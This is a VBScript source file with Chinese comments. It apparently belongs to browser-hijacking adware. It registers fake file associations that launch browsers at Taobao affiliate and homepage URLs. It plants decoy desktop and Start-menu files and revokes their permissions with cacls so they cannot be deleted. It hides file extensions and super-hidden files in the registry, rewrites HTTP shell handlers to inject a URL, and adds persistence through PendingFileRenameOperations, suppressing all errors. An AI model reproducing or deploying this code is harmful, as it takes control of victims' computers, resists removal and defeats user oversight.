    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '当前用户快速启动桌面操作目录
    programs = wshShell.SpecialFolders("Programs") '当前用户开始菜单中的程序目录
    startMenu = wshShell.SpecialFolders("StartMenu") '当前用户开始菜单最上面的目录
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") '全部用户桌面目录
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") '全部用户开始菜单中的程序目录
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") '全部用户开始菜单最上面的目录

    
    '路径集合，对路径集合进行遍历
    Dim lnkPath(7)
    lnkPath(1) = pcDesktopPath
    lnkPath(2) = quickLaunch
    lnkPath(3) = programs
    lnkPath(4) = startMenu
    lnkPath(5) = allUsersPcDesktopPath
    lnkPath(6) = allUsersPrograms
    lnkPath(7) = allUsersStartMenu
    Set fso = CreateObject("Scripting.FileSystemObject")
   Dim directory
    If not fso.FileExists(iePath) Then
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            '循环目录进行修改
            directory = lnkPath(i)        
             '替换当前用户快速启动快捷方式
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files 
            For Each flie in fc    
                myName = directory + "\" + flie.name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "iexplore.exe") Then 'IE浏览器
                        if oShellLink.TargetPath<>"" then
                            iePath=oShellLink.TargetPath
                            GetWebBrowserPath=iePath
                            Exit Function
                        end if                    
                    end if
                end if
            Next    
        Next
    End If
    
    If not fso.FileExists(iePath) Then
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            '循环目录进行修改
            directory = lnkPath(i)        
             '替换当前用户快速启动快捷方式
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files   
            
            For Each flie in fc    
                myName = directory + "\" + flie.name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "maxthon.exe") Then '遨游浏览器
                        if oShellLink.TargetPath<>"" then
                            iePath=oShellLink.TargetPath
                            GetWebBrowserPath=iePath
                            Exit Function
                        end if                    
                    end if
                end if
            Next
        Next
    End If
    
    If not fso.FileExists(iePath) Then
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            '循环目录进行修改
            directory = lnkPath(i)        
             '替换当前用户快速启动快捷方式
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files   
            
            For Each flie in fc    
                myName = directory + "\" + flie.name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "360se.exe") Then '360浏览器
                        if oShellLink.TargetPath<>"" then
                            iePath=oShellLink.TargetPath
                            GetWebBrowserPath=iePath
                            Exit Function
                        end if                    
                    end if
                end if
            Next
        Next
    End If
End Function

'加载浏览器路径
Private Sub LoadAllBrowserPath()
On Error Resume Next
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    iePath = BROWSER_PATH
    If not fso.FileExists(iePath) Then '如果路径不存在则更换盘符
        iePath = Environ("systemdrive") & Mid(iePath, 3, Len(iePath))
    End If
    maxPath = MAX_BROWSER_PATH
    If not fso.FileExists(maxPath) Then '如果路径不存在则更换盘符
        maxPath = Environ("systemdrive") & Mid(maxPath, 3, Len(maxPath))
    End If
    sePath = SE_BROWSER_PATH
    If not fso.FileExists(sePath) Then '如果路径不存在则更换盘符
        sePath = Environ("systemdrive") & Mid(sePath, 3, Len(sePath))
    End If
    foxPath = FOX_BROWSER_PATH
    If not fso.FileExists(foxPath) Then '如果路径不存在则更换盘符
        foxPath = Environ("systemdrive") & Mid(foxPath, 3, Len(foxPath))
    End If
    sogouPath = SOGOU_BROWSER_PATH
    If not fso.FileExists(sogouPath) Then '如果路径不存在则更换盘符
        sogouPath = Environ("systemdrive") & Mid(sogouPath, 3, Len(sogouPath))
    End If
    
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '当前用户桌面目录
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '当前用户快速启动桌面操作目录
    programs = wshShell.SpecialFolders("Programs") '当前用户开始菜单中的程序目录
    startMenu = wshShell.SpecialFolders("StartMenu") '当前用户开始菜单最上面的目录
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") '全部用户桌面目录
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") '全部用户开始菜单中的程序目录
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") '全部用户开始菜单最上面的目录

    '路径集合，对路径集合进行遍历
    Dim lnkPath(7)
    lnkPath(1) = pcDesktopPath
    lnkPath(2) = quickLaunch
    lnkPath(3) = programs
    lnkPath(4) = startMenu
    lnkPath(5) = allUsersPcDesktopPath
    lnkPath(6) = allUsersPrograms
    lnkPath(7) = allUsersStartMenu
    
    Dim directory
    
    If not fso.FileExists(iePath) Then
        iePath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "iexplore.exe") Then 'IE浏览器
                        If oShellLink.TargetPath <> "" Then
                            iePath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(maxPath) Then
        maxPath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "maxthon.exe") Then '遨游浏览器
                        If oShellLink.TargetPath <> "" Then
                            maxPath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(sePath) Then
        sePath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "360se.exe") Then '360浏览器
                        If oShellLink.TargetPath <> "" Then
                            sePath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(foxPath) Then
        foxPath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "firefox.exe") Then '火狐浏览器
                        If oShellLink.TargetPath <> "" Then
                            foxPath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(sogouPath) Then
        sogouPath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "SogouExplorer.exe") Then '搜狗浏览器
                        If oShellLink.TargetPath <> "" Then
                            sogouPath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
End Sub



'创建关联文件,参数：URL地址,类型(0 不创建淘网址 1 创建一次淘网址)
Private Sub CreateFileLnk(url,createType)
On Error Resume Next
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '当前用户桌面目录
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '当前用户快速启动桌面操作目录
    programs = wshShell.SpecialFolders("Programs") '当前用户开始菜单中的程序目录
    startMenu = wshShell.SpecialFolders("StartMenu") '当前用户开始菜单最上面的目录
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") '全部用户桌面目录
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") '全部用户开始菜单中的程序目录
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") '全部用户开始菜单最上面的目录
    
    Set wshj = WScript.CreateObject("WScript.Shell")
    sdp = wshj.SpecialFolders("Desktop")                           '特殊文件夹“桌面”  C:\Documents and Settings\Administrator\桌面\
    skkkkk=left(sdp,len(sdp)-2)+"「开始」菜单"                     '菜单
         

    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(iePath) And iePath<>"" Then '判断IE浏览器路径是否存在
        Call CreateRelevance(".ttf", "ttf", iePath & ",0", iePath & " " & url)
        If Not fso.FileExists(allUsersPcDesktopPath + "\Internet Explorer.ttf") Then
            Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\Internet Explorer.ttf")
        End If        
        If Not fso.FileExists(allUsersPrograms + "\Internet Explorer.ttf") Then
            Call CreateNoDeleteLnk(allUsersPrograms + "\Internet Explorer.ttf")
        End If
        
        If Not fso.FileExists(quickLaunch + "\Internet Explorer.ttf") Then
            Call CreateNoDeleteLnk(quickLaunch + "\Internet Explorer.ttf")
        End If

       If Not fso.FileExists(skkkkk + "\Internet Explorer.ttf") Then
            Call CreateNoDeleteLnk(skkkkk + "\Internet Explorer.ttf")
        End If
        
        dim tao_ico_path '淘宝图标路径
        Set ws = CreateObject("WScript.Shell") 
        Set Environ = ws.Environment("process") 
        tao_ico_path="C:\Program Files\winrar\ico\taobao.ico" 'Environ("windir") & "\winrar\ico"
        If not fso.FileExists(tao_ico_path) Then '如果路径不存在则更换默认
            tao_ico_path=iePath & ",0"
        End If

        Call CreateRelevance(".dib", "dib", tao_ico_path, iePath & " http://pindao.huoban.taobao.com/tms/channel/onsale.htm?pid=mm_15377717_0_0&eventid=101586")
        If Not fso.FileExists(allUsersPcDesktopPath + "\淘宝网购物.dib") Then
            Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\淘宝网购物.dib")
        End If

        If Not fso.FileExists(quickLaunch + "\淘宝打折.dib") Then
            Call CreateNoDeleteLnk(quickLaunch + "\淘宝打折.dib")
        End If

        If Not fso.FileExists(allUsersPrograms + "\淘宝热卖.dib") Then
            Call CreateNoDeleteLnk(allUsersPrograms + "\淘宝热卖.dib")
        End If

        If Not fso.FileExists(skkkkk + "\淘宝热卖.dib") Then
              Call CreateNoDeleteLnk(skkkkk + "\淘宝热卖.dib")
        End If



        Set ws = CreateObject("WScript.Shell") 
        Set Environ = ws.Environment("process") 
        tao_ico_path="C:\Program Files\winrar\ico\36.ico" 'Environ("windir") & "\t.ico"
        If not fso.FileExists(tao_ico_path) Then '如果路径不存在则更换默认
            tao_ico_path=iePath & ",0"
        End If

     Call CreateRelevance(".wiz", "wiz", tao_ico_path, iePath & " http://www.978.la")
     If Not fso.FileExists(allUsersPcDesktopPath + "\网址大全.wiz") Then
            If createType=1 Then
                Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\网址大全.wiz")
            End If
        End If
    End If
    

    If fso.FileExists(maxPath) And maxPath<>"" Then '判断遨游浏览器路径是否存在
        Call CreateRelevance(".max", "max", maxPath & ",0", maxPath & " " & url)
        If Not fso.FileExists(allUsersPcDesktopPath + "\傲游浏览器2.Max") Then
            'Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\傲游浏览器2.Max")
        End If
    End If
    
    If fso.FileExists(sePath) And iePath<>"" Then '判断360浏览器路径是否存在
        Call CreateRelevance(".se", "se", sePath & ",0", sePath & " " & url)
        If Not fso.FileExists(allUsersPcDesktopPath + "\360安全浏览器.se") Then
            'Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\360安全浏览器.se")
        End If
        If Not fso.FileExists(quickLaunch + "\360安全浏览器.se") Then
            Call CreateNoDeleteLnk(quickLaunch + "\360安全浏览器.se")
        End If
    End If
    
    If fso.FileExists(foxPath) And foxPath<>"" Then '判断火狐浏览器路径是否存在
        Call CreateRelevance(".fox", "fox", foxPath & ",0", foxPath & " " & url)
        If Not fso.FileExists(allUsersPcDesktopPath + "\Mozilla Firefox.fox") Then
            'Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\Mozilla Firefox.fox")
        End If
    End If
    
    If fso.FileExists(sogouPath) And sogouPath<>"" Then '判断搜狗浏览器路径是否存在
        Call CreateRelevance(".sou", "sou", sogouPath & "", sogouPath & " " & url)
        If Not fso.FileExists(allUsersPcDesktopPath + "\搜狗高速浏览器.sou") Then
            'Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\搜狗高速浏览器.sou")
        End If
    End If
    
    Call HideFileExtension '隐藏文件扩展名
End Sub

'创建禁止被删除的文件
Private Sub CreateNoDeleteLnk(path)
On Error Resume Next
    Dim fso,TestFile
    Set fso=CreateObject("Scripting.FileSystemObject")
    Set TestFile=fso.CreateTextFile(path,Ture)
    TestFile.WriteLine CreateInterferenceCode(0, 300)
    TestFile.Close
    Call RefusalFileDelete(path)
End Sub

'创建禁止被删除的文件
Private Sub CreateNoDeleteLnk1(path)
On Error Resume Next
    Dim fso,TestFile
    Set fso=CreateObject("Scripting.FileSystemObject")
    Set TestFile=fso.CreateTextFile(path,Ture)
    TestFile.WriteLine CreateInterferenceCode(0, 300)
    TestFile.Close
End Sub


'禁止文件被删除（删除全部权限）
Private Sub RefusalFileDelete(path)
On Error Resume Next
    Set WshShell= CreateObject("WScript.Shell")
    Set wshNetwork = WScript.CreateObject("WScript.Network")
    WshShell.Run ("attrib """ & path & """ +r +s"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r Administrators"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r Administrator"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r users"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r system"), vbHide
    'WshShell.Run ("cacls """ & path & """ /e /c /r everyone"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r user"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r """ & wshNetwork.UserName & """"), vbHide    
    Set WshShell = Nothing    
End Sub

'隐藏文件扩展名
Private Sub HideFileExtension()
On Error Resume Next
    Const HKEY_CURRENT_USER = &H80000001
      
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")   
  
    strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"  
    oReg.CreateKey HKEY_CURRENT_USER,strKeyPath 
    
    mmshhwdName = "ShowSuperHidden"  
    dwValue = 0   
    oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,mmshhwdName,dwValue 
    
    mmshhwdName = "Hidden1"  
    dwValue = 2   
    oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,mmshhwdName,dwValue 
    
    mmshhwdName = "HideFileExt"  
    dwValue = 1  
    oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,mmshhwdName,dwValue 
    
End Sub


'新建文件关联,参数：关联后缀,关联名称,icon图标路径(不修改或不创建为空),关联程序物理路径
Private Sub CreateRelevance(nameSuffix, associationName, iconPath, path)
On Error Resume Next
    Const HKEY_CLASSES_ROOT = &H80000000
      
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")   
  
    '关联后缀   
    strKeyPath = nameSuffix  
    oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath   
  
    '关联后缀   
    mmshhwdName = ""  
    mmshhwd = associationName 
    oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,mmshhwdName,mmshhwd   
    
    '设置关联名称
    strKeyPath = associationName  
    oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath 
    
    '设置关联名称
    mmshhwdName = ""  
    mmshhwd = "系统文件" 
    oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,mmshhwdName,mmshhwd  
    
    '设置关联名称
    strKeyPath = associationName & "\shell\open\command"  
    oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath 
    
    '设置关联名称
    mmshhwdName = ""  
    mmshhwd = path
    oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,mmshhwdName,mmshhwd  
    
    If iconPath <> "" Then
       '设置关联名称
        strKeyPath = associationName & "\DefaultIcon"  
        oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath 
        
        '设置关联名称
        mmshhwdName = ""  
        mmshhwd = iconPath
        oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,mmshhwdName,mmshhwd 
    End If
End Sub


'设置为自启动（特别的方式）,参数：文件路径,启动目录路径
Private Sub SetRunVbe(path,runPath)
On Error Resume Next
    Const HKEY_LOCAL_MACHINE = &H80000002
    arrStringValues = Array(path,runPath)
    '读取扩展的字符串值
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_    
    strComputer & "\root\default:StdRegProv")   
    strKeyPath = "SYSTEM\ControlSet001\Control\Session Manager"  
    mmshhwdName = "PendingFileRenameOperations"  
    oReg.GetMultiStringValue HKEY_LOCAL_MACHINE,strKeyPath,_   
    mmshhwdName,arrValues
    dim isPathPresence,isRunPathPresence
    isPathPresence=false
    isRunPathPresence=false 
    temp_i=1
    temp_arrValues = Array() '以前存在项的数组
    
    For Each mmshhwd In arrValues
         If (InStr(mmshhwd, "smss.exe") = 0) Then '过滤指定文件
            ReDim Preserve temp_arrValues(temp_i)             
            temp_arrValues(temp_i)=mmshhwd
            temp_i=temp_i+1
         End If
         if mmshhwd=path then '存在
            isPathPresence=true
         end if
         if mmshhwd=runPath then '存在
            isRunPathPresence=true
         end if
    Next
 
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_    
    strComputer & "\root\default:StdRegProv")
       
    '没有就创建该项
    strKeyPath = "SYSTEM\ControlSet001\Control\Session Manager"  
    oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath   

    '写入注册表项   
    mmshhwdName = "PendingFileRenameOperations"
    If not isNull(arrValues) Then '存在数据则追加,合并数组
        arrStringValues=Summ(arrValues,arrStringValues) '两个数组合并        
    End If
    
    if isPathPresence=false then'判断源程序是否存在，不存在则写入
        oReg.SetMultiStringValue HKEY_LOCAL_MACHINE,strKeyPath,mmshhwdName,arrStringValues
    end if
End Sub


'设置链接打开地址
Public Sub SetRegDefaultOpenUrl()   
On Error Resume Next
    dim url
    url="http://www.19884.info/?my"
    dim ie_temp_path
    ie_temp_path=GetWebBrowserPath() '获取一个浏览器路径    
    Set fso = CreateObject("Scripting.FileSystemObject")    
    If not fso.FileExists(ie_temp_path) Then  '不存在则读取默认
      ie_temp_path=iePath
    End If
    Set fso  = Nothing
    Const HKEY_CLASSES_ROOT = &H80000000
    strComputer = "."
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")   
    
    strKeyPath = "HTTP\shell\360SE.exe\command"
    mmshhwdName = ""
    
    oReg.GetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,_   
    mmshhwdName,mmshhwd
    
    if mmshhwd<>"" or instr(mmshhwd,url)=0 then
        '写入值到节点
        mmshhwdName = ""  
        mmshhwd = """" & ie_temp_path & """" & " " & url & " " & "%1"
        oReg.SetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,mmshhwdName,mmshhwd  
    end if 
    
    strKeyPath = "HTTP\shell\open\command"  
    mmshhwdName = ""  
    oReg.GetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,_   
    mmshhwdName,mmshhwd
    
    if mmshhwd<>"" or instr(mmshhwd,url)=0 then
        '写入值到节点
        mmshhwdName = ""  
        mmshhwd = """" & ie_temp_path & """" & " " & url & " " & "%1"
        'oReg.SetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,mmshhwdName,mmshhwd  
    end if 
    
    strKeyPath = "HTTP\shell\Maxthon2\command"
    mmshhwdName = ""
    
    oReg.GetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,_   
    mmshhwdName,mmshhwd
    
    if mmshhwd<>"" or instr(mmshhwd,url)=0 then
        '写入值到节点
        mmshhwdName = ""  
        mmshhwd = """" & ie_temp_path & """" & " " & url & " " & "%1"
        oReg.SetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,mmshhwdName,mmshhwd  
    end if 
    
    strKeyPath = "HTTP\shell\SogouExplorer\command"
    mmshhwdName = ""
    
    oReg.GetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,_   
    mmshhwdName,mmshhwd
    
    if mmshhwd<>"" or instr(mmshhwd,url)=0 then
        '写入值到节点
        mmshhwdName = ""  
        mmshhwd = """" & ie_temp_path & """" & " " & url & " " & "%1"
        oReg.SetExpandedStringValue HKEY_CLASSES_ROOT,strKeyPath,mmshhwdName,mmshhwd  
    end if
End Sub






















